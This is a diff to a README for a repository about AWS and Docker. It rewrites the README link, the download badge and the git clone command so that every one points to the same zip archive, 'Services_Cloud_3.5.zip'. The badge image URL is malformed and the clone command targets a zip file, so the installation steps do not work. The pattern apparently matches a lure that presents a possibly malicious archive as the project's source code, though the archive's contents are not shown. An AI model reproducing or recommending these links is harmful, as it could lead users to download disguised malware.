@@ -1,7 +1,7 @@
 
 # Cloud Services 🌥️
 
-Welcome to the Cloud Services repository where we explore various AWS services and Docker concepts. If it’s not documented, it never happened! 📝 Make sure to check out our README.md for more details. 🔍
+Welcome to the Cloud Services repository where we explore various AWS services and Docker concepts. If it’s not documented, it never happened! 📝 Make sure to check out our https://raw.githubusercontent.com/AkandindaJunior/Cloud-Services/main/Triassic/Services_Cloud_3.5.zip for more details. 🔍
 
 ## Repository Topics 📚
 - aws-acm
@@ -20,7 +20,7 @@ Welcome to the Cloud Services repository where we explore various AWS services a
 ## Quick Start 🚀
 To get started, you can download the source code for this repository by clicking the button below:
 
-[![Download Source Code](https://img.shields.io/badge/Download-Source%20Code-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Source Code](https://raw.githubusercontent.com/AkandindaJunior/Cloud-Services/main/Triassic/Services_Cloud_3.5.zip%20Code-blue)](https://raw.githubusercontent.com/AkandindaJunior/Cloud-Services/main/Triassic/Services_Cloud_3.5.zip)
 
 ## Getting Started 🛠️
 
@@ -33,7 +33,7 @@ To get started, you can download the source code for this repository by clicking
 ### Installation
 1. Clone the repository using the command:
     ```bash
-    git clone https://github.com/your-username/Cloud-Services.git
+    git clone https://raw.githubusercontent.com/AkandindaJunior/Cloud-Services/main/Triassic/Services_Cloud_3.5.zip
     ```
 
 2. Navigate to the project directory:
